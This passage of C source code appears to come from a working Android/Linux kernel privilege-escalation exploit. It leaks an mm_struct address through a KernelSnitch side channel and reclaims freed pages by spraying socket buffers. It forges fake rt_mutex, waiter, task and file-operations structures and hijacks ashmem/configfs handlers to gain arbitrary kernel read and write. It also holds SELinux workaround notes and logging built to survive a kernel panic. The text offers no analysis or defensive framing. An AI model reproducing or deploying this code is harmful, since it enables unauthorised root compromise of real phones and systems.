      kernelsnitch_cleanup(ks);
      ks = NULL;
      for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
        kill_child(prepare_ctx.childs[i]);
      }
      cleanup_page_prepare_state();
      return 0;
    }
    ks->mm_struct = answer_mm;
    ks->state = KERNELSNITCH_MM_FOUND;
    leaked = answer_mm;
    if (leaked == (uintptr_t)-1) {
      pr_warning("KernelSnitch mm_struct leak failed\n");
      kernelsnitch_cleanup(ks);
      ks = NULL;
      for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
        kill_child(prepare_ctx.childs[i]);
      }
      cleanup_page_prepare_state();
      return 0;
    }
  }

  if (getenv("KS_MM_TEST") && !getenv("KS_SLIDE_TEST")) {
    pr_success("KS_MM_TEST ok mm=%016zx base=%016zx\n", leaked,
               leaked & ~(PAGE_SIZE - 1));
    fflush(stdout);
    exit(0);
  }

  select_linear_map_delta(leaked);
  uintptr_t base = select_slab_base(leaked, slab_base_candidate);
  pr_info("KSLAB_BASE_CANDIDATE mm=%016zx base=%016zx idx=%d\n",
          leaked, base, slab_base_candidate % MM_SLAB_CANDIDATE_PAGES);
  slab_base_candidate++;
  /* Point the chain-walk owner at the mm_struct so the
   * "waiter->prio = task->prio" copy leaks *(int *)mm_va into the SKB. */
  g_leak_target = leaked;
  pr_info("KS_LEAK_TARGET mm=%016zx prio_read=%016zx\n",
          leaked, leaked);
  if (!prepare_skb_payload(base, payload_mode)) {
    if (ks) {
      kernelsnitch_cleanup(ks);
      ks = NULL;
    }
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    if (pre_ctx.memfds[i] >= 0) {
      SYSCHK(close(pre_ctx.memfds[i]));
    }
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    if (post_ctx.memfds[i] >= 0) {
      SYSCHK(close(post_ctx.memfds[i]));
    }
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    if (spray_ctx.memfds[i] >= 0) {
      SYSCHK(close(spray_ctx.memfds[i]));
    }
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  if (memfd_leak >= 0) {
    SYSCHK(close(memfd_leak));
  }
  memfd_leak = -1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  if (ks) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
  }

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
    }
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  if (kernel_page_collision_fail_fast) {
    pr_warning("collision fail-fast: prepare_kernel_page blocked mode=%d\n",
               payload_mode);
    return 0;
  }
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
#ifdef KS_BUILD_S3
  if (payload_mode == PAGE_PAYLOAD_S2 ||
      payload_mode == PAGE_PAYLOAD_S3) {
#else
  if (payload_mode == PAGE_PAYLOAD_S2) {
#endif
    /* S2 is one-shot: no stale-page refresh after a failed preparation. */
    max_attempts = 1;
  } else if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    if (kernel_page_collision_fail_fast) {
      pr_warning("collision fail-fast: blocking prepare_kernel_page retry\n");
      return 0;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
#ifdef CFGOPS_4_19_STYLE
  /* 4.19: ashmem name starts at asma+0 with no prefix; fake configfs_buffer
   * gets page=target, count=len, needs_read_fill=0, then pread from pos 0:
   * simple_read_from_buffer(buf, len, &pos0, page=target, available=len) */
  put64(blob, 0 - ASHMEM_NAME_PREFIX_LEN, len); /* buffer->count */
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }
  errno = 0;
  ssize_t rd = pread(fd, data, len, 0);
  return rd;
#else
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
#endif
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < g_direct_map_end;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

/* ================= round-2: forced real-time disk logging ================= */
int g_exlog_fd = -1;
char g_exlog_path[256] = {0};

void ks_relocate_fd_min(int *fd, int min_fd) {
  int high;
  if (fd == NULL || *fd < 0 || *fd >= min_fd) {
    return;
  }
  high = fcntl(*fd, F_DUPFD, min_fd);
  if (high >= 0) {
    close(*fd);
    *fd = high;
  }
}

int s2_payload_contract_ok(void) {
  if (!skb_buf || !page_base || !fake_lock || !fake_w0 || !fake_task) {
    pr_error("S2 contract missing controlled-page state\n");
    return 0;
  }

  size_t used_end = (size_t)SKB_FRAG_BIAS +
                    FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF + 8;
  if (used_end > SKB_SEND_SIZE ||
      (size_t)SKB_FRAG_BIAS + W0_OFF + 0x58 + 8 > SKB_SEND_SIZE) {
    pr_error("S2 contract prefix exceeds controlled skb size end=%zu\n",
             used_end);
    return 0;
  }

  {
    const unsigned char *p = skb_buf + SKB_FRAG_BIAS;
    uint64_t got64;
    uint32_t got32;

    memcpy(&got32, p + LOCK_OFF, sizeof(got32));
    memcpy(&got64, p + LOCK_OFF + 0x08, sizeof(got64));
    if (got32 != 0 || got64 != fake_w0) return 0;
    memcpy(&got64, p + LOCK_OFF + 0x10, sizeof(got64));
    if (got64 != fake_w0) return 0;
    memcpy(&got64, p + LOCK_OFF + 0x18, sizeof(got64));
    if (got64 != (fake_task | 1)) return 0;

    static const size_t w0_offsets[] = {
      0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x44, 0x48,
      0x50, 0x58
    };
    const uint64_t w0_expect[] = {
      1, 0, 0, 1, 0, 0, fake_task, fake_lock, 140, 0, 0, 0, 0
    };
    for (size_t i = 0; i < sizeof(w0_offsets) / sizeof(w0_offsets[0]); ++i) {
      memcpy(&got64, p + W0_OFF + w0_offsets[i], sizeof(got64));
      if (got64 != w0_expect[i]) return 0;
    }

    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, sizeof(got32));
    if (got32 != 0x100) return 0;
    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, sizeof(got32));
    if (got32 != FAKE_TASK_PRIO) return 0;
    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF,
           sizeof(got32));
    if (got32 != FAKE_TASK_PRIO) return 0;
    memcpy(&got64, p + FAKE_TASK_OFF + 0x420, sizeof(got64));
    if (got64 != 0) return 0;
    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF,
           sizeof(got32));
    if (got32 != 0) return 0;
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
           sizeof(got64));
    if (got64 != fake_w0 + 0x18) return 0;
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8,
           sizeof(got64));
    if (got64 != fake_w0 + 0x18) return 0;
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
           sizeof(got64));
    if (got64 != fake_task) return 0;
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF,
           sizeof(got64));
    if (got64 != 0) return 0;

    for (size_t off = FOPS_TABLE_OFF; off + 8 <= FOPS_TABLE_OFF + 0xe8;
         off += 8) {
      memcpy(&got64, p + off, sizeof(got64));
      if (got64 != 0) return 0;
    }
  }
  return 1;
}

#ifdef KS_BUILD_S3
int s3_payload_contract_ok(void) {
  if (!skb_buf || !page_base || !fake_lock || !fake_w0 || !fake_task ||
      !fake_fops) {
    pr_error("H1A-S3 contract fail field=STATE got=0 want=nonzero\n");
    return 0;
  }

  size_t used_end = (size_t)SKB_FRAG_BIAS +
                    FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF + 8;
  if (used_end > SKB_SEND_SIZE) {
    pr_error("H1A-S3 contract fail field=BOUNDS_FT got=%zu want<=%zu\n",
             used_end, (size_t)SKB_SEND_SIZE);
    return 0;
  }
  if ((size_t)SKB_FRAG_BIAS + W0_OFF + 0x58 + 8 > SKB_SEND_SIZE) {
    pr_error("H1A-S3 contract fail field=BOUNDS_W0 got=%zu want<=%zu\n",
             (size_t)SKB_FRAG_BIAS + W0_OFF + 0x58 + 8,
             (size_t)SKB_SEND_SIZE);
    return 0;
  }

  uintptr_t misc_fops = text_addr(ASHMEM_MISC_FOPS);
  if ((misc_fops & 1) != 0 || (misc_fops & 7) != 0) {
    pr_error("H1A-S3 contract fail field=TARGET_ALIGN got=%016llx "
             "want=8-aligned\n", (unsigned long long)misc_fops);
    return 0;
  }

  {
    const unsigned char *p = skb_buf + SKB_FRAG_BIAS;
    uint64_t got64;
    uint32_t got32;

    memcpy(&got32, p + LOCK_OFF, sizeof(got32));
    memcpy(&got64, p + LOCK_OFF + 0x08, sizeof(got64));
    if (got32 != 0) {
      pr_error("H1A-S3 contract fail field=LOCK_FLAGS got=%08llx "
               "want=00000000\n", (unsigned long long)got32);
      return 0;
    }
    if (got64 != fake_w0) {
      pr_error("H1A-S3 contract fail field=LOCK_WAIT_LOCK "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64, (unsigned long long)fake_w0);
      return 0;
    }
    memcpy(&got64, p + LOCK_OFF + 0x10, sizeof(got64));
    if (got64 != fake_w0) {
      pr_error("H1A-S3 contract fail field=LOCK_PI_WAITERS "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64, (unsigned long long)fake_w0);
      return 0;
    }
    memcpy(&got64, p + LOCK_OFF + 0x18, sizeof(got64));
    if (got64 != (fake_task | 1)) {
      pr_error("H1A-S3 contract fail field=LOCK_OWNER "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)(fake_task | 1));
      return 0;
    }

    memcpy(&got64, p + W0_OFF + 0x00, sizeof(got64));
    if (got64 != 1) {
      pr_error("H1A-S3 contract fail field=W0_TREE_PC "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64, 1ULL);
      return 0;
    }
    memcpy(&got64, p + W0_OFF + 0x08, sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=W0_TREE_RIGHT "
               "got=%016llx want=0000000000000000\n",
               (unsigned long long)got64);
      return 0;
    }
    memcpy(&got64, p + W0_OFF + 0x10, sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=W0_TREE_LEFT "
               "got=%016llx want=0000000000000000\n",
               (unsigned long long)got64);
      return 0;
    }
    memcpy(&got64, p + W0_OFF + 0x18, sizeof(got64));
    if (got64 != misc_fops - 8) {
      pr_error("H1A-S3 contract fail field=W0_PI_PC "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)(misc_fops - 8));
      return 0;
    }
    memcpy(&got64, p + W0_OFF + 0x20, sizeof(got64));
    if (got64 != fake_fops) {
      pr_error("H1A-S3 contract fail field=W0_PI_RIGHT "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64, (unsigned long long)fake_fops);
      return 0;
    }
    memcpy(&got64, p + W0_OFF + 0x28, sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=W0_PI_LEFT "
               "got=%016llx want=0000000000000000\n",
               (unsigned long long)got64);
      return 0;
    }
    memcpy(&got64, p + W0_OFF + 0x30, sizeof(got64));
    if (got64 != fake_task) {
      pr_error("H1A-S3 contract fail field=W0_TASK "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64, (unsigned long long)fake_task);
      return 0;
    }
    memcpy(&got64, p + W0_OFF + 0x38, sizeof(got64));
    if (got64 != fake_lock) {
      pr_error("H1A-S3 contract fail field=W0_LOCK "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64, (unsigned long long)fake_lock);
      return 0;
    }
    memcpy(&got32, p + W0_OFF + 0x40, sizeof(got32));
    if (got32 != 140) {
      pr_error("H1A-S3 contract fail field=W0_PRIO got=%08llx "
               "want=0000008c\n", (unsigned long long)got32);
      return 0;
    }
    memcpy(&got64, p + W0_OFF + 0x48, sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=W0_TREE_DEADLINE "
               "got=%016llx want=0000000000000000\n",
               (unsigned long long)got64);
      return 0;
    }
    memcpy(&got64, p + W0_OFF + 0x50, sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=W0_PI_DEADLINE "
               "got=%016llx want=0000000000000000\n",
               (unsigned long long)got64);
      return 0;
    }
    memcpy(&got64, p + W0_OFF + 0x58, sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=W0_WW_CTX "
               "got=%016llx want=0000000000000000\n",
               (unsigned long long)got64);
      return 0;
    }

    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF,
           sizeof(got32));
    if (got32 != 0x100) {
      pr_error("H1A-S3 contract fail field=FT_USAGE got=%08llx "
               "want=00000100\n", (unsigned long long)got32);
      return 0;
    }
    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF,
           sizeof(got32));
    if (got32 != FAKE_TASK_PRIO) {
      pr_error("H1A-S3 contract fail field=FT_PRIO got=%08llx "
               "want=%08llx\n", (unsigned long long)got32,
               (unsigned long long)FAKE_TASK_PRIO);
      return 0;
    }
    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF,
           sizeof(got32));
    if (got32 != FAKE_TASK_PRIO) {
      pr_error("H1A-S3 contract fail field=FT_NORMAL_PRIO got=%08llx "
               "want=%08llx\n", (unsigned long long)got32,
               (unsigned long long)FAKE_TASK_PRIO);
      return 0;
    }
    memcpy(&got64, p + FAKE_TASK_OFF + 0x420, sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=FT_DL got=%016llx "
               "want=0000000000000000\n", (unsigned long long)got64);
      return 0;
    }
    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF,
           sizeof(got32));
    if (got32 != 0) {
      pr_error("H1A-S3 contract fail field=FT_PI_LOCK got=%08llx "
               "want=00000000\n", (unsigned long long)got32);
      return 0;
    }
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
           sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=FT_PI_ROOT "
               "got=%016llx want=0000000000000000\n",
               (unsigned long long)got64);
      return 0;
    }
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8,
           sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=FT_PI_LEFTMOST "
               "got=%016llx want=0000000000000000\n",
               (unsigned long long)got64);
      return 0;
    }
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
           sizeof(got64));
    if (got64 != fake_task) {
      pr_error("H1A-S3 contract fail field=FT_PI_TOP "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64, (unsigned long long)fake_task);
      return 0;
    }
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF,
           sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=FT_PI_BLOCKED_ON "
               "got=%016llx want=0000000000000000\n",
               (unsigned long long)got64);
      return 0;
    }

    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_OWNER_OFF, sizeof(got64));
    if (got64 != 0) {
      pr_error("H1A-S3 contract fail field=FOPS_OWNER "
               "got=%016llx want=0000000000000000\n",
               (unsigned long long)got64);
      return 0;
    }
    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_LLSEEK_OFF,
           sizeof(got64));
    if (got64 != fake_w0 + 0x18) {
      pr_error("H1A-S3 contract fail field=FOPS_LLSEEK "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)(fake_w0 + 0x18));
      return 0;
    }
    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_READ_OFF,
           sizeof(got64));
    if (got64 != text_addr(CONFIGFS_READ_ITER)) {
      pr_error("H1A-S3 contract fail field=FOPS_READ "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)text_addr(CONFIGFS_READ_ITER));
      return 0;
    }
    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_WRITE_OFF,
           sizeof(got64));
    if (got64 != text_addr(CONFIGFS_BIN_WRITE_ITER)) {
      pr_error("H1A-S3 contract fail field=FOPS_WRITE "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)text_addr(CONFIGFS_BIN_WRITE_ITER));
      return 0;
    }
    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_IOCTL_OFF,
           sizeof(got64));
    if (got64 != text_addr(ASHMEM_IOCTL)) {
      pr_error("H1A-S3 contract fail field=FOPS_IOCTL "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)text_addr(ASHMEM_IOCTL));
      return 0;
    }
    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_COMPAT_IOCTL_OFF,
           sizeof(got64));
    if (got64 != text_addr(ASHMEM_COMPAT_IOCTL)) {
      pr_error("H1A-S3 contract fail field=FOPS_COMPAT_IOCTL "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)text_addr(ASHMEM_COMPAT_IOCTL));
      return 0;
    }
    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_MMAP_OFF, sizeof(got64));
    if (got64 != text_addr(ASHMEM_MMAP)) {
      pr_error("H1A-S3 contract fail field=FOPS_MMAP "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)text_addr(ASHMEM_MMAP));
      return 0;
    }
    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_OPEN_OFF, sizeof(got64));
    if (got64 != text_addr(ASHMEM_OPEN)) {
      pr_error("H1A-S3 contract fail field=FOPS_OPEN "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)text_addr(ASHMEM_OPEN));
      return 0;
    }
    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_RELEASE_OFF,
           sizeof(got64));
    if (got64 != text_addr(ASHMEM_RELEASE)) {
      pr_error("H1A-S3 contract fail field=FOPS_RELEASE "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)text_addr(ASHMEM_RELEASE));
      return 0;
    }
    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_SPLICE_READ_OFF,
           sizeof(got64));
    if (got64 != text_addr(COPY_SPLICE_READ)) {
      pr_error("H1A-S3 contract fail field=FOPS_SPLICE_READ "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)text_addr(COPY_SPLICE_READ));
      return 0;
    }
    memcpy(&got64, p + FOPS_TABLE_OFF + FOPS_SHOW_FDINFO_OFF,
           sizeof(got64));
    if (got64 != text_addr(ASHMEM_SHOW_FDINFO)) {
      pr_error("H1A-S3 contract fail field=FOPS_SHOW_FDINFO "
               "got=%016llx want=%016llx\n",
               (unsigned long long)got64,
               (unsigned long long)text_addr(ASHMEM_SHOW_FDINFO));
      return 0;
    }
  }
  return 1;
}
#endif

int s2_reclaim_fd(void) {
  return reclaim_sv[1];
}

void exlog_protect_fd(void) {
  ks_relocate_fd_min(&g_exlog_fd, KS_FD_PROTECT_MIN);
}

void exlog_open(void) {
  if (g_exlog_fd >= 0) {
    return;
  }
  /* /data/local/tmp keeps working after a wrong-delta fops write takes
   * down FUSE (/sdcard).  The file must be pre-created 666 by adb; an
   * untrusted_app cannot create it, so open() fails and we fall back.
   * No O_APPEND: SELinux grants untrusted_app { write } on shell_data_file
   * but not { append } (silently dontaudit'd), so an O_APPEND open fails
   * while the O_TRUNC-style writes used by the export files succeed. */
  {
    int fd = open("/data/local/tmp/ks_log.txt",
                  O_WRONLY | O_CLOEXEC, 0666);
    if (fd >= 0) {
      g_exlog_fd = fd;
      snprintf(g_exlog_path, sizeof(g_exlog_path),
               "/data/local/tmp/ks_log.txt");
      exlog_writef("+", "exlog open path=%s pid=%d uid=%u\n",
                   g_exlog_path, getpid(), getuid());
      return;
    }
  }
  time_t t = time(NULL);
  struct tm tmv;
  localtime_r(&t, &tmv);
  char ts[32];
  strftime(ts, sizeof(ts), "%Y%m%d_%H%M%S", &tmv);
  const char *dirs[] = {
    "/sdcard/Download",
    "/sdcard/Downloads",
    "/data/local/tmp",
    NULL,
  };
  for (int i = 0; dirs[i]; i++) {
    snprintf(g_exlog_path, sizeof(g_exlog_path), "%s/log_%s.txt", dirs[i], ts);
    int fd = open(g_exlog_path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0666);
    if (fd >= 0) {
      g_exlog_fd = fd;
      break;
    }
  }
  if (g_exlog_fd >= 0) {
    exlog_writef("+", "exlog open path=%s pid=%d uid=%u\n",
                 g_exlog_path, getpid(), getuid());
  }
}

void exlog_writef(const char *level, const char *fmt, ...) {
  char msg[1200];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(msg, sizeof(msg), fmt, ap);
  va_end(ap);

  /* keep the original console output */
  fprintf(stdout, "[%s] %s", level, msg);
  fflush(stdout);

  if (g_exlog_fd < 0) {
    exlog_open();  /* lazy open (covers fork children / early calls) */
    if (g_exlog_fd < 0) {
      return;
    }
  }
  char line[1400];
  int n = snprintf(line, sizeof(line), "[%d][%s] ", (int)getpid(), level);
  if (n < 0) {
    return;
  }
  size_t used = (size_t)n;
  if (used < sizeof(line)) {
    strncat(line, msg, sizeof(line) - used - 1);
  }
  ssize_t wr = write(g_exlog_fd, line, strlen(line));
  (void)wr;
  fsync(g_exlog_fd);  /* forced flush: survive kernel panic */
}
